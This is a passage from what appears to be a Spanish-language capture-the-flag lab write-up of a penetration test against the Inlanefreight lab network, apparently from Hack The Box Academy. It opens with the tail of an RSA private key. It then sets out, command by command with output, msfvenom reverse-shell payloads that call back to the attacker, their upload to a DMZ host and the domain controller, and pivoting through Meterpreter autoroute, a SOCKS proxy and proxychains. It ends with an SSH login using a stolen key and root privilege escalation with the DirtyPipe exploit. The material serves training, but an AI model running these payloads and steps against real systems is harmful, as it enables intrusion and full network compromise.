gxEGvyl7W1Vi528f21D3uASxrQj+PqYBXhvlSRoEIqXAE6ZHD1p2UFoxCZ+a0fmn
2KEFWFDUbgyTpK3ofVRM7Slhc7C7xuzzqQihIslu2E9vepQPMyDHlw==
-----END RSA PRIVATE KEY-----
```

#### Adaptadores de red interna

Encontramos la red interna `172.16.9.1`, por lo que buscaremos equipos dentro de esta red para probar el id\_rsa de admin que hemos encontrado:

```powershell
*Evil-WinRM* PS C:\Department Shares\IT\Private\Networking> ipconfig /all

|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:5985-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:5985-<><>-OK

<---SNIP--->

Ethernet adapter Ethernet1:

   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter #2
   Physical Address. . . . . . . . . : 00-50-56-B9-3A-88
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::ad24:d126:19f:f31d%7(Preferred)
   IPv4 Address. . . . . . . . . . . : 172.16.9.3(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 172.16.9.1
   DHCPv6 IAID . . . . . . . . . . . : 167792726
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-2A-29-62-C9-00-50-56-B9-16-51
   DNS Servers . . . . . . . . . . . : ::1
                                       127.0.0.1
   NetBIOS over Tcpip. . . . . . . . : Enabled
```

#### Ping Sweep de red interna

Encontramos la IP del equipo conectado a la red interna: `172.16.9.25`

{% hint style="warning" %}
Ejecutarlo 2 o 3 veces para asegurarnos
{% endhint %}

```powershell
*Evil-WinRM* PS C:\> 1..100 | % {"172.16.9.$($_): $(Test-Connection -count 1 -comp 172.16.9.$($_) -quiet)"}
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.3:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.3:5985  ...  OK
172.16.9.1: False
172.16.9.2: False
172.16.9.3: True
172.16.9.4: False
<---SNIP--->
172.16.9.23: False
172.16.9.24: False
172.16.9.25: True
172.16.9.26: False
172.16.9.27: False
```

#### Crear shell.elf con msfvenom

```shell-session
afsh4ck@kali$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.15.191 LPORT=443 -f elf > shell.elf

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 123 bytes
Final size of elf file: 207 bytes
```

#### Subir shell con SCP a DMZ01

```shell-session
afsh4ck@kali$ scp -i dmz01_key shell.elf root@10.129.14.97:/    
shell.elf                                                             100%  207     4.7KB/s   00:00 
```

Y ejecutamos el archivo `shell.elf` en el sistema de destino:

```shell-session
root@dmz01:/tmp# chmod +x shell.elf 
root@dmz01:/tmp# ./shell.elf 
```

<figure><img src="/files/J2Y9IaQ9xBu9e9z2WI24" alt=""><figcaption></figcaption></figure>

#### Port Forwarding Local

```shell-session
(Meterpreter 1)(/root) > portfwd add -R -l 8443 -p 1234 -L 10.10.15.191
[*] Reverse TCP relay created: (remote) :1234 -> (local) [::]:1234
```

A continuación, creamos un payload ejecutable que cargaremos en el controlador de dominio.

```shell-session
afsh4ck@kali$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.8.120 -f exe -o dc_shell.exe LPORT=1234

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: dc_shell.exe
```

#### Subimos el payload al DC

```powershell
*Evil-WinRM* PS C:\> upload "/home/kali/Escritorio/machines/htb/academy/inlanefreight/dc_shell.exe"
                                        
Info: Uploading /home/kali/Escritorio/machines/htb/academy/enterprise/dc_shell.exe to C:\\dc_shell.exe
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.3:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.3:5985  ...  OK
                                        
Data: 9556 bytes of 9556 bytes copied
                                        
Info: Upload successful!
```

Llevamos la sesión de Meterpreter al background:

```bash
meterpreter > bg
[*] Backgrounding session 1...
```

Iniciamos otro multi/handler en la misma sesión de msfconsole para capturar el shell del DC.

```bash
[msf](Jobs:0 Agents:1) exploit(multi/handler) >> set payload windows/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:1) exploit(multi/handler) >> set lhost 0.0.0.0
[msf](Jobs:0 Agents:1) exploit(multi/handler) >> set lport 8443
[msf](Jobs:0 Agents:1) exploit(multi/handler) >> exploit
```

Ejecutamos el payload en el DC y, si todo va según lo planeado, la capturaremos en nuestro listener.

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> .\dc_shell.exe
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.8.3:5985-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.8.3:5985-<><>-OK
```

```powershell
[*] Started reverse TCP handler on 0.0.0.0:8443 
[*] Sending stage (200262 bytes) to 10.10.14.15
[*] Meterpreter session 2 opened (10.10.14.15:8443 -> 10.10.14.15:46313 ) at 2022-06-22 21:36:20 -0400

meterpreter > getuid
Server username: INLANEFREIGHT\Administrator

meterpreter > sysinfo
Computer        : DC01
OS              : Windows Server 2019 (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : INLANEFREIGHT
Logged On Users : 3
Meterpreter     : x64/windows
```

#### Configurar ruta a la subred 172.16.9.0/23

```
meterpreter > run autoroute -s 172.16.9.0/23

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 172.16.9.0/255.255.254.0...
[+] Added route to 172.16.9.0/255.255.254.0 via 10.10.15.191
[*] Use the -p option to list all active routes
```

#### Comprobación

```powershell
meterpreter > bg
[*] Backgrounding session 2...

msf6 exploit(multi/handler) > route print

IPv4 Active Routing Table
=========================

   Subnet             Netmask            Gateway
   ------             -------            -------
   172.16.9.0         255.255.254.0      Session 2
```

#### Configurar SOCKS Proxy

```bash
[msf](Jobs:0 Agents:2) exploit(multi/handler) >> use auxiliary/server/socks_proxy 
[msf](Jobs:0 Agents:2) auxiliary(server/socks_proxy) >> show options 

Module options (auxiliary/server/socks_proxy):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        Proxy password for SOCKS5 listener
   SRVHOST   0.0.0.0          yes       The local host or network interface to listen on. This
                                        must be an address on the local machine or 0.0.0.0 to l
                                        isten on all addresses.
   SRVPORT   1080             yes       The port to listen on
   USERNAME                   no        Proxy username for SOCKS5 listener
   VERSION   5                yes       The SOCKS version to use (Accepted: 4a, 5)


Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  Run a SOCKS proxy server


[msf](Jobs:0 Agents:2) auxiliary(server/socks_proxy) >> set srvport 9050
[msf](Jobs:0 Agents:2) auxiliary(server/socks_proxy) >> set version 4a
[msf](Jobs:0 Agents:2) auxiliary(server/socks_proxy) >> run
[*] Auxiliary module running as background job 0.
[msf](Jobs:1 Agents:2) auxiliary(server/socks_proxy) >> 
[*] Starting the SOCKS proxy server
```

#### Editar archivo de configuración de proxychains

Editamos el archivo `/etc/proxychains4.conf` para usar el puerto `9050` especificado anteriormente. Podemos comentar la línea anterior que ya teníamos:

```bash
# defaults set to "tor"
#socks4 	127.0.0.1 9050
#socks4 127.0.0.1 8081
socks4 127.0.0.1 9050
```

#### Comprobación

<pre class="language-shell-session"><code class="lang-shell-session"><strong>afsh4ck@kali$ proxychains nmap -sT -Pn -p 22 172.16.9.25
</strong>
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-29 20:06 CEST
Nmap scan report for 172.16.9.25
Host is up.

PORT   STATE    SERVICE
22/tcp filtered ssh
</code></pre>

#### Conexión por SSH

```shell-session
afsh4ck@kali$ chmod 600 ssmallsadm-id_rsa                  
afsh4ck@kali$ proxychains ssh -i ssmallsadm-id_rsa ssmallsadm@172.16.9.25

[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.9.25:22  ...  OK
<---SNIP--->
Last login: Mon May 23 08:48:13 2022 from 172.16.0.1
ssmallsadm@MGMT01:~$ 
```

#### Acceso a la flag

```shell-session
ssmallsadm@MGMT01:~$ ls
flag.txt

ssmallsadm@MGMT01:~$ cat flag.txt
3c4996521690cc76446894***********
```

### Pregunta 2

> Escala privilegios a root en el host MGMT01. Enviar el contenido del archivo `flag.txt` en el directorio /root.

#### Versión del Kernel

```shell-session
ssmallsadm@MGMT01:~$ uname -a
Linux MGMT01 5.10.0-051000-generic #202012132330 SMP Sun Dec 13 23:33:36 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```

Al buscar la versión del Kernel nos encontramos un exploit para elevat privilegios a través de `DirtyPipe` con el CVE asociado `CVE-2022-0847`:

{% embed url="<https://www.exploit-db.com/exploits/50808>" %}

#### Crear archivo dirtypipe.c con vim

```shell-session
ssmallsadm@MGMT01:~$ vim dirtypipe.c
```

Aquí pegamos el exploit y lo guardamos con `:wq`

```bash
:wq
"dirtypipe.c" [New] 214L, 7311C written
```

#### Compilación con gcc

```shell-session
ssmallsadm@MGMT01:~$ gcc dirtypipe.c -o dirtypipe
ssmallsadm@MGMT01:~$ chmod +x dirtypipe
ssmallsadm@MGMT01:~$ ./dirtypipe
Usage: ./dirtypipe SUID
```

#### Buscar binarios SUID

```shell-session
ssmallsadm@MGMT01:~$ find / -perm -4000 2>/dev/null

/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/pkexec
/usr/bin/passwd
```

Usaremos el binario `ssh-keysign`

#### Ejecución de DirtyPipe

```shell-session
ssmallsadm@MGMT01:~$ ./dirtypipe /usr/lib/openssh/ssh-keysign

[+] hijacking suid binary..
[+] dropping suid shell..
[+] restoring suid binary..
[+] popping root shell.. (dont forget to clean up /tmp/sh ;))
# whoami     
root
```

#### Acceso a la flag

```
# cat flag.txt  
206c03861986c0e264438cb6***********
```
